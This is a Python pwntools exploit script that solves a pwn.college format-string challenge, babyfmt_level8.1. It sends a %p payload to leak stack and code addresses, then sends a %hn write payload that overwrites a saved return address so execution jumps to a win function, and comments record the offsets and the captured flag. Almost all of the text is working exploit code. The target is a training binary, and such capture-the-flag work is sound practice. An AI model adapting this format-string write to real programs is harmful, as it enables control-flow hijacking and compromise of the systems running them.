
from pwn import *
context.binary = "/challenge/babyfmt_level8.1"
context.terminal = ['tmux','splitw','-h']
p = process()
#p = gdb.debug("/challenge/babyfmt_level8.1")
p.recv()
payload1 = bytes('%199$p.%201$p','utf-8')
p.sendline(payload1)
p.recvuntil(b'Your input is:')
p.recvline()
leak = p.recvline().strip(b'\n').decode().split('.')
print(leak)
leak[0] = leak[0][:-3] + '350'
leak_win_add = int(leak[0],base=16)
leak_overwrite = int(leak[1],base=16) - 0x150
log.info("Address of win: %s", hex(leak_win_add))
log.info("Place to overwrite: %s", hex(leak_overwrite))
time.sleep(1)
overwrite = int(leak[0][-4:],base=16) -2-142
print(overwrite)
payload2 = b'A'*2 + str('%{}c%86$hn'.format(overwrite).ljust(16,'.')).encode() + p64(leak_overwrite)
#payload2 = b'A'*2 + bytes('%10c%88$hhn%10c$89$hhn'.ljust(32,'.'),'utf-8') + p64(leak_overwrite) + p64(leak_overwrite+1)
p.sendline(payload2)
p.interactive()
#rip: 199
#address contain rip: 201 then -0x150
#input: 83
#Flag: pwn.college{Md4HKm3HhSXNfT3obxX5TP8OFQR.dFzM0MDLwETOyEzW}
